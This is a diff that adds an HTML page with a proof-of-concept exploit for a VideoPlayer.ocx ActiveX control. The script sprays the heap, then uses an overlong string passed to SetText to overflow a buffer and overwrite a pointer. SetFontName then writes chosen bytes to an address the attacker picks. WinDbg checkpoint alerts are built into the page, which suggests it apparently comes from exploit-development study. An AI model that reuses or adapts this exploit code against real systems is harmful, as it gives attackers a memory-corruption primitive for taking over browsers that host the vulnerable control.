@@ -1,0 +1,32 @@
+<!DOCTYPE HTML>
+<script>
+// create VideoPlayer.ocx ActiveX Object
+var obj = document.createElement("object");
+obj.setAttribute("classid", "clsid:4B3476C6-185A-4D19-BB09-718B565FA67B");
+
+// spray the heap with 512M to allocate memory around 0x10101020
+data = "\u2222\u2222"
+while (data.length < 0x80000){data += data}
+div = document.createElement("div")
+for (i=0; i<=0x400; i++){
+    div.setAttribute("attr"+i, data.substring(0, (0x80000 - 2 - 4 - 0x20) / 2))
+}
+alert("Check in WinDbg before write: dc 10101000 L14")
+
+addr = "\x20\x10\x10\x10"  // WHERE TO WRITE (0x10101020 + 0xC)
+
+// prepare buffer with address we want to write to
+ptrBuf = ""
+// fill buffer: length = relative ptr address - buffer start + ptr offset
+while (ptrBuf.length < (0x92068 - 0x916a8 + 0xC)){ptrBuf += "A"}
+ptrBuf += addr
+
+// overflow buffer and overwrite the pointer value after buffer
+obj.SetText(ptrBuf,0,0)
+
+// use overwritten pointer to conduct memory write of 4 bytes
+obj.SetFontName("\xbe\xba\xfe\xca") // WHAT TO WRITE
+alert("Check after write: dc 10101000 L14")
+
+</script>
+
